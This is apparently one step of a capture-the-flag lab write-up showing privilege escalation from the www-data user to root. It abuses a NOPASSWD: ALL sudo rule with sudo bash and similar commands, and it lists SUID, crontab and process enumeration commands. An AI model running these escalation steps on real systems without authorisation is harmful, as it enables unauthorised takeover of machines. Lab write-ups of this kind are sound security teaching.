<div align="center">

# 👑 Step 5: Privilege Escalation

<img src="https://img.shields.io/badge/Phase-Privilege%20Escalation-27ae60?style=for-the-badge" />
<img src="https://img.shields.io/badge/Method-Sudo%20Abuse-27ae60?style=for-the-badge" />

</div>

---

## 🎯 Objective

Escalate from `www-data` to `root` to get the 3rd ingredient.

---

## 🛠️ Commands Used

### 🔍 Check Sudo Privileges

```bash
# 🔎 Check what we can run as sudo
sudo -l
```

<details>
<summary>🎁 Click to see the SHOCKING result</summary>

```
Matching Defaults entries for www-data on ip-10-10-x-x:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on ip-10-10-x-x:
    (ALL) NOPASSWD: ALL
```

**🤯 OMG! We can run ALL commands as root WITHOUT password!**

</details>

---

### 👑 Become Root

```bash
# 🎯 Simplest method
sudo bash
```

**Result:**
```
root@ip-10-10-x-x:~# 
```

**✅ WE ARE ROOT!**

---

### 🔄 Alternative Methods

All of these work because of `NOPASSWD: ALL`:

```bash
# Method 1
sudo su
```

```bash
# Method 2
sudo /bin/bash
```

```bash
# Method 3
sudo -i
```

```bash
# Method 4
sudo sh
```

---

### 🔍 Additional Checks (For Learning)

```bash
# 🔎 Check SUID binaries
find / -perm -4000 2>/dev/null
```

```bash
# 🔎 Check cron jobs
cat /etc/crontab
```

```bash
# 🔎 Check running processes
ps aux
```

---

## 📊 Results Summary

<div align="center">

| 🎯 Finding | 📝 Value |
|:----------:|:---------|
| **Sudo Privileges** | `(ALL) NOPASSWD: ALL` |
| **Escalation Method** | `sudo bash` |
| **Current User** | `root` ✅ |
| **Difficulty** | Trivial 😎 |

</div>

---

## 🧠 Analysis

> 💡 **Key Insight:**
> 
> This is a **major misconfiguration**. The web server user (`www-data`) should NEVER have passwordless sudo access to ALL commands. In real-world scenarios, this would be a critical vulnerability.

---

## 🚀 Next Step

➡️ **Flags** → [06-flags/](../06-flags/)

---

<div align="center">

**Made with 💜 by Swoyon**

</div>
